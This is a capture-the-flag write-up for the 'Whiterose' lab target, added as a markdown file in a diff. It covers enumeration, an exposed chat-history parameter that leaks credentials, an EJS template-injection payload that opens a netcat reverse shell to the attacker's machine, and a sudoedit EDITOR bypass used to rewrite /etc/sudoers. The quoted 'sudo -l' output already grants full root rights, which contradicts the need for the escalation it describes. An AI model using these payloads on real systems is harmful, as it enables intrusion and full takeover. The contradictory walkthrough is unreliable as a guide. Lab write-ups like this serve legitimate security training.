@@ -1,0 +1,221 @@
+# Whiterose CTF - Professional Writeup
+
+**Target:** 10.82.182.13
+
+**Objective:** Retrieve Tyrell Wellick's phone number, user.txt, and root.txt
+
+---
+
+## 1. Information Gathering
+
+### 1.1 Network Scan
+```bash
+nmap -sC -sV -p- -T4 10.82.182.13 -oN nmap_scan.txt
+
+Findings:
+text
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+
+1.2 Web Service Identification
+
+The HTTP service hosted a site accessible via cyprusbank.thm. This domain was added to the local hosts file:
+text
+
+10.82.182.13    cyprusbank.thm
+
+1.3 Directory Enumeration
+bash
+
+feroxbuster -u http://cyprusbank.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+
+Result: No significant directories were discovered.
+2. Virtual Host Discovery
+
+Subdomain fuzzing was performed to identify additional vhosts:
+bash
+
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+     -u http://cyprusbank.thm/ \
+     -H "Host: FUZZ.cyprusbank.thm" \
+     -fw 1
+
+Identified Subdomains:
+
+    www.cyprusbank.thm - Identical to main site
+
+    admin.cyprusbank.thm - Login panel at /login
+
+Hosts file was updated accordingly:
+text
+
+10.82.182.13    cyprusbank.thm www.cyprusbank.thm admin.cyprusbank.thm
+
+3. Initial Access
+
+The challenge provided a credential hint: Olivia Cortez:olivi8
+
+These credentials were used to authenticate to:
+text
+
+http://admin.cyprusbank.thm/login
+
+Successful authentication granted access to the administrative dashboard.
+3.1 Chat History Analysis
+
+Within the messaging interface, parameter manipulation revealed historical conversations:
+text
+
+GET /messages/?c=0 HTTP/1.1
+Host: admin.cyprusbank.thm
+
+This request exposed previous chat logs containing sensitive information:
+text
+
+DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing
+Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
+
+Credential Obtained: Gayle Bev:p~]P@5!6;rs558:q
+4. Privilege Escalation - Gayle Bev Account
+4.1 Authentication as Gayle Bev
+
+The newly discovered credentials were used to log in as Gayle Bev, providing elevated privileges within the application.
+4.2 Objective Completion - Phone Number
+
+With Gayle Bev's access level, Tyrell Wellick's phone number was visible in the interface, fulfilling the first objective.
+4.3 Vulnerability Identification
+
+The settings panel contained a customer management feature allowing administrators to add customer names and passwords. Upon submission, the application displayed:
+text
+
+password updated to [entered_password]
+
+This confirmed an information disclosure vulnerability where user input was reflected in the response.
+5. Remote Code Execution via EJS Injection
+5.1 Vulnerability Analysis
+
+Using Burp Suite, the password update request was intercepted. Removing the password parameter triggered an error referencing EJS line 14, identifying the templating engine as EJS (Embedded JavaScript).
+5.2 Payload Development
+
+Research indicated that EJS versions with configurable options are vulnerable to RCE through the outputFunctionName parameter. A payload was crafted to execute a reverse shell:
+text
+
+POST /settings HTTP/1.1
+Host: admin.cyprusbank.thm
+...
+
+name=test&password=x&settings[view options][outputFunctionName]=x;require('child_process').execSync('busybox nc 10.X.X.X 8888 -e bash');s
+
+Note: The IP address was replaced with the attacker's machine IP.
+5.3 Listener Configuration
+bash
+
+nc -lvnp 8888
+
+5.4 Payload Execution
+
+The modified request was forwarded, and the payload executed successfully, establishing a reverse shell connection as the web user.
+5.5 User Flag Retrieval
+bash
+
+whoami
+# web
+
+cat /home/web/user.txt
+# [user.txt flag obtained]
+
+6. Privilege Escalation to Root
+6.1 Sudo Permissions Audit
+bash
+
+sudo -l
+
+Output:
+text
+
+User web may run the following commands on cyprusbank:
+    (ALL : ALL) NOPASSWD: ALL
+    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+
+6.2 Sudoedit Exploitation
+
+The sudoedit binary with NOPASSWD permission on an Nginx configuration file presented an opportunity for privilege escalation. By manipulating the EDITOR environment variable, arbitrary files could be edited with root privileges:
+bash
+
+export EDITOR="vim -- /etc/sudoers"
+sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
+
+This command opened /etc/sudoers in Vim instead of the intended Nginx configuration file.
+6.3 Sudoers Modification
+
+Within the sudoers file, the following line was added under the user privilege specification:
+text
+
+web ALL=(ALL:ALL) NOPASSWD: ALL
+
+The file was saved and the editor closed.
+6.4 Root Shell Acquisition
+bash
+
+sudo bash
+# Root shell obtained
+
+cat /root/root.txt
+# [root.txt flag obtained]
+
+7. Flags Summary
+Flag	Location	Method of Acquisition
+Tyrell Wellick's Phone Number	Admin Panel	Accessed via Gayle Bev account
+user.txt	/home/web/user.txt	RCE via EJS injection
+root.txt	/root/root.txt	Sudoedit privilege escalation
+8. Attack Chain Visualization
+text
+
+Nmap Scan
+   ↓
+Subdomain Fuzzing → admin.cyprusbank.thm discovered
+   ↓
+Olivia Cortez:olivi8 → Initial access
+   ↓
+Chat history (?c=0) → Gayle Bev credentials discovered
+   ↓
+Gayle Bev login → Phone number obtained + Settings tab access
+   ↓
+Password reflection vulnerability identified
+   ↓
+EJS template injection → RCE as web user
+   ↓
+Sudo -l → sudoedit misconfiguration identified
+   ↓
+EDITOR manipulation → Sudoers file modified
+   ↓
+sudo bash → Root access
+
+9. Vulnerability Summary
+Vulnerability	Impact	Remediation
+Exposed chat history via parameter manipulation	Credential disclosure	Implement proper access controls on chat history
+Hardcoded credentials in chat logs	Unauthorized access	Remove sensitive data from logs
+Password reflection in UI	Information disclosure	Sanitize output and avoid reflecting user input
+EJS template injection	Remote code execution	Disable dynamic template options, sanitize user input
+Sudoedit misconfiguration	Privilege escalation	Restrict sudoedit to specific files only
+10. Conclusion
+
+This CTF challenge demonstrated a realistic attack path combining:
+
+    Web application enumeration and virtual host discovery
+
+    Credential harvesting through exposed chat history
+
+    Exploitation of information disclosure vulnerabilities
+
+    Template engine RCE via EJS configuration abuse
+
+    Privilege escalation through misconfigured sudo permissions
+
+The methodology followed standard penetration testing practices, with each phase building upon information gathered in previous steps. Proper input validation, secure logging practices, and principle of least privilege for sudo access would have prevented this compromise.
+
+Writeup Author: RAVI NEUPANE
+Date: February 23, 2026
+Classification: CONFIDENTIAL
